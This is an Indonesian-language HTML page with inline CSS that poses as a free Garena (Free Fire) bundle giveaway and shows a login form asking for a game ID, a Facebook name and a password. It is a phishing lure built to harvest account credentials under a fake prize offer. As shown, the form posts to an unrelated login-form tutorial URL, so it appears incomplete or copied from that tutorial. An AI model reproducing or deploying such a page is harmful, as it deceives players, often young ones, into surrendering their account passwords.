<!DOCTYPE html>
<html>
    <head>
        <title>Ayo dapatkan bundle gratis dari Garena </title>
        <meta name= "description" content= "Jangan Sampai ketinggalan"/>
        <link rel="icon" type="image/jpg" href="https://dafunda.com/wp-content/uploads/2020/02/set-free-fire-terbaik-5-758x426.jpg">
        <link rel="stylesheet" href="style.css">
    </head>
    <body>
        <form class="box" action="https://www.ansoriweb.com/2020/01/cara-membuat-login-form-keren-dengan-html-css.html" method="post">
        <center><h1>Login Akun</h1></center>
        <center><input type="akun" name="akun" placeholder="ID FF"</center>
        <center><input type="text" name="text" placeholder="Nama facebook"></center>
        <center><input type="password" name="password" placeholder="Password"></center>
        <center><input type="submit" name="password" value="Tekan Untuk lanjut"></center>
        </form>
    </body>
</html>
<style>
    body{

margin: 0;

padding: 0;

font-family: sans-serif;

background: url(https://i.pinimg.com/564x/9a/a9/91/9aa99136d15b0760fa4d2e9568e49e53.jpg); 

background-repeat: no-repeat;

background-size: cover;

}

.box{

width: 300px;

padding: 40px;

position: absolute;

top: 50%;

left: 50%;

transform: translate(-50%,-50%);

background: #191919;

text-align: center;

}

.box h1{

color: white;

text-transform: uppercase;

font-weight: 500;

}

.box input[type = "text"], .box input[type = "password"],.box input[type = "akun"] {

border: 0;

background: none;

display: block;

margin: 20px auto;

text-align: center;

border: 2px solid #3498db;

padding: 14px 10px;

width: 200px;

outline: none;

color: white;

border-radius: 24px;

transition: 0.25s;

}

.box input[type = "text"]:focus,.box input[type = "password"]:focus,.box input[type = "akun" ]:focus{

width: 280px;

border-color: #2ecc71;

}



.box input[type = "submit"]

{

 border: 0;

background: none;

display: block;

margin: 20px auto;

text-align: center;

border: 2px solid #2ecc71;

padding: 14px 40px;

outline: none;

color: white;

border-radius: 24px;

transition: 0.25s;

cursor: pointer;

}



.box input[type = "submit"]:hover

{

background: #2ecc71;
}
</style>
